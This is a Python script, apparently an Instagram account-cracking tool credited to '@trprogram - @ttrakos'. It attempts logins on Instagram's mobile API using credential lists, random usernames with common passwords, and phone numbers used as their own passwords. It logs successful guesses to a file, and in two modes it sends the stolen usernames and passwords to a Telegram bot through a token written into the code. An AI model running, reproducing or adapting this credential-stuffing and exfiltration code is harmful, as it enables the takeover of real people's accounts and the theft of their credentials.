import requests
import os,random
from uuid import uuid4
import secrets
F = '\x1b[2;32m' 
Z1 = '\x1b[2;31m'
S = '\x1b[1;33m'
list_password = [
"123123",
"11221122",
"1234qwer",
"1q2w3e4r5t",
'1122334455',
'Aa123123',
'asdasdasd',
'11221122',
'11223311',
'ahmed123',
'Asd@!123',
"123qwe123@", 
"123456789zxcvbnm", 
"zzaaqq11", 
"1122@@##", 
'12341234',
]
url = 'https://i.instagram.com/api/v1/accounts/login/'
headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}


print("""\033[1;31m
       [1] Hunt From File . 
       [2] Hunt From Random Generate. 
       [3] Hunt Random Number. 
""")
ci = int(input("\033[2;32m[~] Enter Number :"))
if ci == 1:
    id = input("Enter Id :")
    ch = 0
    done = 0
    eroor = 0
    file = open("as.txt","r").read().splitlines()
    for ac in file:
        if not ac:
            continue
        username = str(ac.split(":")[0])
        password = str(ac.split(":")[1])
        
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username,
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        ch+=1
        if 'challenge_required' in req.text:
            cookie = secrets.token_hex(8) * 2
            head = {'HOST':'www.instagram.com', 
            'KeepAlive':'True', 
            'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
            'Cookie':cookie, 
            'Accept':'*/*', 
            'ContentType':'application/x-www-form-urlencoded', 
            'X-Requested-With':'XMLHttpRequest', 
            'X-IG-App-ID':'936619743392459', 
            'X-Instagram-AJAX':'missing', 
            'X-CSRFToken':'missing', 
            'Accept-Language':'en-US,en;q=0.9'}
            url_id = f"https://www.instagram.com/{username}/?__a=1"
            req_id = requests.get(url_id, headers=head).json()
            name = str(req_id['graphql']['user']['full_name'])
            id = str(req_id['graphql']['user']['id'])
            followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
            following = str(req_id['graphql']['user']['edge_follow']['count'])
            re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
            ree = re.json()
            dat = ree['data']
            kp =f"""
Hello Dear New Hunt!
=== === === ===
- He Name : {name}
- He Username : {username}
- He Password : {password}
- He Followers : {followes} 
- He Following : {following} 
- He Id : {id}
- He Sort Date : {dat} 
=== === === ===
By : @trprogram - @ttrakos
                   """
                    
            open("true.txt", "a").write(f"{kp}\n")
            
            
            done+=1
        else:
            eroor+=1
        os.system("clear")
        print(f"\n\n\033[2;32m{F}[=] Done : {done}\n{Z1}[=] Bad : {eroor}\n{S}[=] Check Count : {ch}\n\n\n{req.text}")

elif ci == 2:
    id = input("Enter Id :")
    while True:
        username = str("".join(random.choice("qwertyuiopasdfghjklzxcvbnm1234567890_.")for i in range(int(4))))
        password = str(random.choice(list_password))
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username,
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        print(req.text)
        if '"challenge_required"' in req.text:
            requests.post(f"https://api.telegram.org/bot5107756653:AAEr2_As3ElJuq237u5MxhGfjPJC6VxHZSo/sendMessage?chat_id={id}&text=New Hit Dear!\nUsername : {username}\nPassword : {password}")
            print(f"\033[2;32m[+] True : {username}:{password} ")
            open("true.txt", "a").write(f"{username}:{password}\n")
        else:
            print(f"\033[1;31m[/] Error : {username}:{password} ")
            
elif ci == 3:
    id = input("Enter Id :")
    while True:
        user = str("".join(random.choice("1234567890")for i in range(int(10))))
        username = "+1"+user
        password = user
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username,
         'device_id':uid, 
         'from_reg':'false',  
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        if 'challenge_required' in req.text:
            requests.post(f"https://api.telegram.org/bot5107756653:AAEr2_As3ElJuq237u5MxhGfjPJC6VxHZSo/sendMessage?chat_id={id}&text=New Hit Dear!\nUsername : {username}\nPassword : {password}")
            print(req.text)
            print(f"[+] \033[2;32mTrue : {username}:{password} ")
            open("true.txt", "a").write(f"{username}:{password}\n")
        else:
            print(f"\033[1;31m[\] Error : {username}:{password} ")